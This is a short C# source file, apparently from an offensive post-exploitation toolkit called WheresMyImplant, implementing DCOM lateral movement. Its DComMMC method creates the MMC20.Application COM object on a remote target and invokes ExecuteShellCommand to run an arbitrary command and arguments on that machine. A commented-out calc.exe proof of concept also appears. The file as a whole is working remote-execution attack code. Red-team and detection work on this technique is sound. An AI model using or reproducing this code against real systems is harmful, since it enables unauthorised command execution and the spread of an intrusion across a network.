using System;
using System.Collections.Generic;
using System.Net;
using System.Reflection;


namespace WheresMyImplant
{
    ////////////////////////////////////////////////////////////////////////////////
    //https://www.cybereason.com/blog/dcom-lateral-movement-techniques
    ////////////////////////////////////////////////////////////////////////////////
    public sealed class DCom : Lateral
    {
        ////////////////////////////////////////////////////////////////////////////////
        //https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/
        ////////////////////////////////////////////////////////////////////////////////
        public static void DComMMC(String target, String command, String arguments)
        {
            Type comType = Type.GetTypeFromProgID("MMC20.Application");
            Object instance = Activator.CreateInstance(comType, target);
            //Object obj = instance.Unwrap();
            comType.InvokeMember("Document.ActiveView.ExecuteShellCommand", BindingFlags.InvokeMethod, null, instance, new Object[] { command, null, null, "2"});

            /*
             * Assembly generation failed -- Referenced assembly 'Interop.MMC20' does not have a strong nam
             * MMC20.Application mmc = (MMC20.Application)Activator.CreateInstance(comType, target);
             * mmc.Document.ActiveView.ExecuteShellCommand("calc.exe", null, null, "2");
            */

            Type ComType = Type.GetTypeFromProgID("MMC20.Application", target);
            object RemoteComObject = Activator.CreateInstance(ComType);

            object Document = RemoteComObject.GetType().InvokeMember("Document", BindingFlags.GetProperty, null, RemoteComObject, null);
            object ActiveView = Document.GetType().InvokeMember("ActiveView", BindingFlags.GetProperty, null, Document, null);
            ActiveView.GetType().InvokeMember("ExecuteShellCommand", BindingFlags.InvokeMethod, null, ActiveView, new object[] { command, null, arguments, "7" });

        }
    }
}